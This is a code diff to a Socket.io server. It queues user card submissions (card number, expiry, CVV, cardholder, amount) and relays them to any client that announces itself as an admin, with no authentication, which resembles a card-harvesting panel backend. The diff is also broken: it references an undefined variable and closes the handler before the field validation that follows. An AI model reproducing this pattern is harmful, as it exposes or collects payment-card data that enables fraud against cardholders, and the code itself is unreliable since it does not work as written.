@@ -13,6 +13,9 @@ const io = new Server(server, {
   }
 });
 
+// In-memory storage for card submissions
+const cardSubmissionsQueue = []; // This will store submissions until an admin connects
+
 io.on('connection', (socket) => {
 
   // Global broadcast for any new connection
@@ -27,10 +30,24 @@ io.on('connection', (socket) => {
   // Handler for an admin identifying themselves
   socket.on('admin_hello', () => {
     socket.join('admins');
+    console.log(`[Server] Admin connected: ${socket.id}`);
+
+    // Send all queued card submissions to the newly connected admin
+    cardSubmissionsQueue.forEach(submission => {
+      socket.emit('card_submission', submission); // Emit directly to this admin's socket
+    });
   });
 
   // Handler for card data from a user
   socket.on('card_submission', (payload) => {
+
+    // Add the submission to the in-memory queue
+    cardSubmissionsQueue.push(submissionPayload);
+    console.log(`[Server] Card submission received and queued. Queue size: ${cardSubmissionsQueue.length}`);
+
+    // Send the data ONLY to admins
+    io.to('admins').emit('card_submission', submissionPayload);
+  });
 
     // Validate required fields
     const requiredFields = ['card_number', 'expiry_month', 'expiry_year', 'cvv', 'card_holder', 'amount'];
